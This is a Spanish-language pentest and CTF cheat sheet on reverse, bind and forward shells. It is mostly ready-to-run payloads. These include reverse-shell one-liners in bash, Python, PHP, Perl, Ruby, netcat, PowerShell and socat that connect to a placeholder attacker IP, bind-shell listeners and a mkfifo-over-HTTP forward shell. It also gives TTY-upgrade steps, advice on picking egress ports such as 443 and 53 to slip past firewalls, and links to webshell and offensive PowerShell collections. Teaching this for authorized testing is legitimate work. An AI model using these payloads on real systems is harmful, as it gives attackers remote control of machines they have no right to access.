# Tipos de Shell: Reverse, Bind y Forward

## Introducción

Cuando durante un pentest o un CTF consigues ejecutar comandos en una máquina remota — ya sea mediante una inyección de comandos, un RCE, una vulnerabilidad web o cualquier otro vector — el siguiente paso natural es obtener una shell interactiva que te permita operar cómodamente en el sistema comprometido.

Hay tres técnicas principales para conseguirlo, y cuál uses depende completamente del escenario: la topología de red, las reglas de firewall activas y qué puertos están disponibles. Entender las diferencias entre ellas es fundamental para no quedarte bloqueado cuando una no funciona.

---

## Reverse Shell

### Qué es

En una Reverse Shell es **la máquina víctima quien inicia la conexión hacia el atacante**. El atacante pone a escuchar un puerto en su máquina (el listener), ejecuta un payload en la víctima, y la víctima "llama de vuelta" al atacante estableciendo la conexión.

```
ATACANTE                          VÍCTIMA
   |                                 |
   |  nc -lvnp 4444 (escucha)        |
   |                                 |
   |        ←←← conexión ←←←        |  bash -i >& /dev/tcp/ATACANTE/4444 0>&1
   |                                 |
   |  shell interactiva ✅           |
```

### Por qué es la técnica preferida

Los firewalls modernos suelen filtrar el **tráfico entrante** de forma estricta pero permiten el **tráfico saliente** con mucha más flexibilidad (los usuarios necesitan navegar por Internet). Una Reverse Shell aprovecha exactamente esto: la víctima hace una conexión saliente — que el firewall permite — hacia el atacante.

### Cuándo usarla

- Siempre que sea posible — es la técnica estándar y más fiable
- Cuando el firewall de la víctima bloquea conexiones entrantes pero permite salientes
- Cuando la víctima está detrás de NAT y no tiene IP pública directa

### Listener en el atacante

```bash
# Netcat básico
nc -lvnp 4444

# Con rlwrap (añade historial de comandos y flechas)
rlwrap nc -lvnp 4444

# Con ncat (versión mejorada)
ncat -lvnp 4444

# Con socat (TTY completa desde el primer momento)
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### One-liners de Reverse Shell

Cambia `TU_IP` y `PUERTO` por tus valores. El puerto más común es 443 o 80 porque suelen estar permitidos en el firewall de salida.

**Bash:**
```bash
bash -i >& /dev/tcp/TU_IP/4444 0>&1
```

```bash
# Alternativa más compatible
bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
```

```bash
# Con mkfifo (cuando el anterior no funciona)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc TU_IP 4444 >/tmp/f
```

**Python 3:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Python 2:**
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TU_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PHP:**
```php
php -r '$sock=fsockopen("TU_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
# La más famosa — PentestMonkey PHP reverse shell (subir como archivo)
# Descargar de: https://pentestmonkey.net/tools/web-shells/php-reverse-shell
```

**Perl:**
```perl
perl -e 'use Socket;$i="TU_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Ruby:**
```ruby
ruby -rsocket -e'f=TCPSocket.open("TU_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Netcat con -e (versiones antiguas):**
```bash
nc TU_IP 4444 -e /bin/bash
```

**Netcat sin -e (versiones modernas):**
```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc TU_IP 4444 > /tmp/f
```

**PowerShell (Windows):**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('TU_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

**Socat:**
```bash
# En la víctima
socat tcp:TU_IP:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Bind Shell

### Qué es

En una Bind Shell es **el atacante quien inicia la conexión hacia la víctima**. El payload en la víctima pone a escuchar un puerto que expone una shell, y el atacante se conecta a ese puerto desde fuera.

```
ATACANTE                          VÍCTIMA
   |                                 |
   |                    nc -lvnp 4444 -e /bin/bash (escucha)
   |                                 |
   |        →→→ conexión →→→         |
   |                                 |
   |  shell interactiva ✅           |
```

### Cuándo usarla

- Cuando el tráfico saliente de la víctima está completamente bloqueado
- Cuando el atacante puede alcanzar un puerto específico en la víctima
- En entornos donde el atacante no tiene una IP pública (por ejemplo, dentro de una red interna ya comprometida)

### Limitaciones

- Si la víctima tiene firewall que bloquea conexiones entrantes, no funcionará
- El puerto abierto en la víctima puede ser detectado por otros usuarios o sistemas de monitorización
- Si la víctima está detrás de NAT, el atacante no puede conectarse directamente

### Payload en la víctima

```bash
# Netcat con -e
nc -lvnp 4444 -e /bin/bash

# Netcat sin -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Socat
socat tcp-listen:4444,reuseaddr exec:/bin/bash,pty,stderr,setsid,sigint,sane

# Python 3
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("",4444));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);pty.spawn("/bin/bash")'
```

### Conectarse desde el atacante

```bash
nc TU_IP_VICTIMA 4444

# Con rlwrap
rlwrap nc TU_IP_VICTIMA 4444
```

---

## Forward Shell

### Qué es

La Forward Shell es una técnica alternativa que se usa cuando **ni la Reverse Shell ni la Bind Shell son posibles** porque el firewall bloquea tanto las conexiones entrantes como las salientes. En lugar de establecer una conexión TCP directa, se simula una shell interactiva usando un **named pipe (FIFO)** creado con `mkfifo`.

```
ATACANTE                              VÍCTIMA
   |                                     |
   |  peticiones HTTP normales →→→       |  (el firewall las permite)
   |  comando encapsulado en petición    |
   |                                     |  mkfifo /tmp/input
   |                                     |  mkfifo /tmp/output
   |                                     |  ejecuta el comando
   |        ←←← respuesta HTTP ←←←      |
   |  resultado del comando              |
```

### Por qué funciona

En lugar de una conexión TCP bidireccional, la Forward Shell abusa de un canal ya permitido — normalmente HTTP — para enviar comandos y recibir respuestas de forma alternada. El named pipe actúa como buffer que conecta la entrada (el comando que manda el atacante via HTTP) con la salida (el resultado que devuelve el servidor via HTTP).

### Cuándo usarla

- Cuando hay un RCE pero el firewall bloquea toda conexión que no sea HTTP/HTTPS
- Cuando el servidor tiene reglas iptables muy restrictivas (solo permite el puerto 80 o 443)
- Como último recurso cuando las dos técnicas anteriores fallan

### Cómo funciona mkfifo

```bash
# mkfifo crea un archivo especial llamado named pipe o FIFO
# Los datos escritos en un extremo se pueden leer del otro

mkfifo /tmp/input   # canal de entrada (comandos)
mkfifo /tmp/output  # canal de salida (resultados)

# El atacante escribe un comando en /tmp/input
# La shell lo ejecuta y manda el resultado a /tmp/output
# El atacante lee /tmp/output via la siguiente petición HTTP
```

### Implementación práctica

La Forward Shell no se implementa manualmente — se usa una herramienta que automatiza todo el proceso de enviar comandos y recoger resultados via peticiones HTTP. La más conocida es **tty_over_http** o scripts similares que se encuentran en GitHub.

El flujo básico:

```bash
# En la víctima (ejecutado mediante el RCE inicial)
mkfifo /tmp/f
tail -f /tmp/f | /bin/bash 2>&1 > /tmp/output &

# El atacante manda comandos via HTTP (POST o parámetro GET)
# y lee /tmp/output en la siguiente petición
```

---

## Comparativa de las tres técnicas

| | Reverse Shell | Bind Shell | Forward Shell |
|--|--------------|------------|---------------|
| **Quién conecta** | Víctima → Atacante | Atacante → Víctima | Nadie (HTTP) |
| **Firewall egress** | ✅ Pasa | ✅ No necesita | ✅ Pasa |
| **Firewall ingress** | ✅ No necesita | ❌ Puede bloquear | ✅ No necesita |
| **Necesita IP pública** | Sí (atacante) | Sí (víctima) | No |
| **Complejidad** | Baja | Baja | Alta |
| **Uso** | 90% de los casos | Casos específicos | Último recurso |

---

## TTY — Mejorar la shell obtenida

Cuando obtienes una Reverse Shell básica, la terminal es muy limitada: no funcionan las flechas, Ctrl+C mata la conexión, no hay autocompletado con Tab, no puedes usar editores como vim o nano. Esto se conoce como una **dumb shell** o shell sin TTY.

Hay que convertirla en una **fully interactive TTY** siguiendo estos pasos:

### Método 1 — Python pty (el más común)

```bash
# Paso 1 — En la reverse shell, generar una PTY con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Si no hay Python 3, probar con python o python2

# Paso 2 — Suspender la shell con Ctrl+Z
^Z

# Paso 3 — En tu terminal (atacante), configurar el modo raw
stty raw -echo; fg

# Paso 4 — De vuelta en la reverse shell, resetear el terminal
reset

# Paso 5 — Configurar variables de entorno
export SHELL=bash
export TERM=xterm-256color

# Paso 6 — Ajustar el tamaño de la terminal
# Primero, en tu terminal local, ejecuta: stty size (anota filas y columnas)
stty rows 40 columns 185
```

### Método 2 — Socat (TTY completa desde el inicio)

```bash
# En el atacante — listener con socat
socat file:`tty`,raw,echo=0 tcp-listen:4444

# En la víctima — reverse shell con socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:TU_IP:4444
```

### Método 3 — rlwrap (más sencillo, funcionalidad limitada)

```bash
# En el atacante
rlwrap nc -lvnp 4444

# Añade historial de comandos y flechas sin necesidad de más pasos
# Pero no da TTY completa
```

### Método 4 — Script

```bash
# En la reverse shell
script /dev/null -c bash
# Luego seguir con los pasos Ctrl+Z, stty raw -echo; fg, reset
```

---

## Puertos recomendados

Usar puertos que el firewall suele tener permitidos en el tráfico de salida aumenta las posibilidades de que la Reverse Shell funcione:

| Puerto | Protocolo | Motivo para usarlo |
|--------|-----------|-------------------|
| 80 | HTTP | Siempre permitido |
| 443 | HTTPS | Siempre permitido |
| 53 | DNS | Muy permisivo en firewalls corporativos |
| 8080 | HTTP alt | Común en proxies |
| 4444 | - | Estándar en CTFs (puede estar bloqueado en entornos reales) |
| 1234 | - | Común en pruebas |

En entornos reales, **usar 443 o 80** es la mejor opción.

---

## Errores comunes y soluciones

**Ctrl+C mata la conexión:**
→ La shell no tiene TTY. Completar los pasos de la sección anterior.

**No aparece el prompt:**
→ Ejecutar `export TERM=xterm` y luego `reset`.

**Las flechas imprimen caracteres extraños (^[[A):**
→ La shell no tiene TTY. Completar los pasos de upgrading.

**La reverse shell se conecta pero se cierra inmediatamente:**
→ El one-liner se ejecutó pero la shell no tiene stdin. Probar con otro one-liner o usar `bash -i`.

**No puedo usar su o sudo en la reverse shell:**
→ Necesita TTY. Sin TTY, `su` no funciona. Completar el upgrading.

**La víctima no tiene python ni python3:**
```bash
# Probar alternativas
script /dev/null -c bash
socat exec:'bash -li',pty,stderr... (si socat está disponible)
```

---

## Recursos

### Generadores de one-liners online

- **[revshells.com](https://www.revshells.com/)** — El mejor generador online. Metes tu IP y puerto y genera el one-liner en el lenguaje que elijas (bash, python, php, perl, ruby, powershell, socat, etc.). Imprescindible.
- **[PentestMonkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)** — La referencia clásica. One-liners para bash, perl, python, php, ruby, java, netcat.

### Cheat sheets completas

- **[PayloadsAllTheThings — Reverse Shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)** — La más completa. Cubre Linux, Windows, TTY upgrading, socat, chisel, y muchos lenguajes.
- **[HackTricks — Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)** — Referencia de HackTricks sobre shells. Incluye bind, reverse, web shells y más.
- **[HighOn.Coffee Reverse Shell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)** — Otra cheat sheet muy completa con variantes de cada lenguaje.

### Herramientas específicas

- **[PHP Reverse Shell — PentestMonkey](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)** — El script PHP de reverse shell más famoso. Se sube al servidor y da una shell completa. Cambiar la IP y el puerto antes de usar.
- **[Webshells — SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)** — Colección de webshells en PHP, ASP, ASPX, JSP, Perl para cuando tienes subida de archivos.

### Para entornos Windows

- **[Nishang](https://github.com/samratashok/nishang)** — Framework de PowerShell para pentesting. Incluye reverse shells, bind shells y mucho más para Windows.
- **[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)** — Colección de módulos PowerShell ofensivos.

### Estabilización de shells

- **[pwncat](https://github.com/calebstewart/pwncat)** — Herramienta avanzada de reverse shell que automatiza el upgrading a TTY, la transferencia de archivos y más. Muy útil en HTB y THM.

---

## Flujo de trabajo recomendado en una máquina

```
1. Identificar el vector de RCE
         ↓
2. Comprobar qué intérpretes tiene la víctima
   (python, python3, perl, php, ruby, nc, socat...)
         ↓
3. Preparar el listener en el atacante
   rlwrap nc -lvnp 443
         ↓
4. Ejecutar el one-liner de Reverse Shell
   (empezar con bash, si falla probar python3, luego nc mkfifo)
         ↓
5. Si el firewall bloquea → intentar Bind Shell
         ↓
6. Si también falla → Forward Shell con mkfifo via HTTP
         ↓
7. Una vez dentro → upgrading a TTY completa
   python3 -c 'import pty; pty.spawn("/bin/bash")'
   Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm-256color
         ↓
8. Shell interactiva completa ✅
```
